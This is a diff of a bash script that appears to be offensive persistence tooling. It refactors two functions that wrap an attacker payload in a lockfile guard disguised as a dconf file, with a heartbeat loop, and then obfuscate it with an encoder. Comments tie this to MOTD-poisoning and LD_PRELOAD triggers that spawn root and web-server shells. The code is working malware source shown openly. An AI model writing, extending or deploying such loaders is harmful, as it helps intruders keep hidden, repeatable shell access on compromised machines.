@@ -65,26 +65,22 @@ ob_decoder() {
 # (motd_poison, ld_preload).
 #
 # Guard logic:
-#   - If lockfile exists and was touched within 60s -> active root session -> skip
-#   - Otherwise -> fire shell, write lockfile, start heartbeat to keep it fresh
-#   - When shell dies -> heartbeat removes lockfile -> next trigger fires freely
+#   - If lockfile exists and was touched within 60s → active root session → skip
+#   - Otherwise → fire shell, write lockfile, start heartbeat to keep it fresh
+#   - When shell dies → heartbeat removes lockfile → next trigger fires freely
 ob_guarded_decoder_root() {
     local plaintext="$1"
     local lock="/var/tmp/.dconf-lock-root"
+    local nl=$'\n'
 
-    # Wrap the raw payload with guard check + heartbeat + shell spawn
-    local wrapped
-    wrapped="$(cat <<WRAP
-L=${lock}
-if [ -f \$L ]; then
-  AGE=\$(( \$(date +%s) - \$(stat -c %Y \$L 2>/dev/null || echo 0) ))
-  [ \$AGE -lt 60 ] && exit 0
-fi
-echo \$\$ > \$L
-( while kill -0 \$\$ 2>/dev/null; do touch \$L; sleep 30; done; rm -f \$L ) &
-${plaintext}
-WRAP
-)"
+    local wrapped="L=${lock}${nl}"
+    wrapped+="if [ -f \$L ]; then${nl}"
+    wrapped+="  AGE=\$(( \$(date +%s) - \$(stat -c %Y \$L 2>/dev/null || echo 0) ))${nl}"
+    wrapped+="  [ \$AGE -lt 60 ] && exit 0${nl}"
+    wrapped+="fi${nl}"
+    wrapped+="echo \$\$ > \$L${nl}"
+    wrapped+="( while kill -0 \$\$ 2>/dev/null; do touch \$L; sleep 30; done; rm -f \$L ) &${nl}"
+    wrapped+="${plaintext}"
 
     local blob
     blob=$(ob_encode "$wrapped")
@@ -103,19 +99,16 @@ WRAP
 ob_guarded_decoder_www() {
     local plaintext="$1"
     local lock="/var/tmp/.dconf-lock-www"
+    local nl=$'\n'
 
-    local wrapped
-    wrapped="$(cat <<WRAP
-L=${lock}
-if [ -f \$L ]; then
-  AGE=\$(( \$(date +%s) - \$(stat -c %Y \$L 2>/dev/null || echo 0) ))
-  [ \$AGE -lt 60 ] && exit 0
-fi
-echo \$\$ > \$L
-( while kill -0 \$\$ 2>/dev/null; do touch \$L; sleep 30; done; rm -f \$L ) &
-${plaintext}
-WRAP
-)"
+    local wrapped="L=${lock}${nl}"
+    wrapped+="if [ -f \$L ]; then${nl}"
+    wrapped+="  AGE=\$(( \$(date +%s) - \$(stat -c %Y \$L 2>/dev/null || echo 0) ))${nl}"
+    wrapped+="  [ \$AGE -lt 60 ] && exit 0${nl}"
+    wrapped+="fi${nl}"
+    wrapped+="echo \$\$ > \$L${nl}"
+    wrapped+="( while kill -0 \$\$ 2>/dev/null; do touch \$L; sleep 30; done; rm -f \$L ) &${nl}"
+    wrapped+="${plaintext}"
 
     local blob
     blob=$(ob_encode "$wrapped")
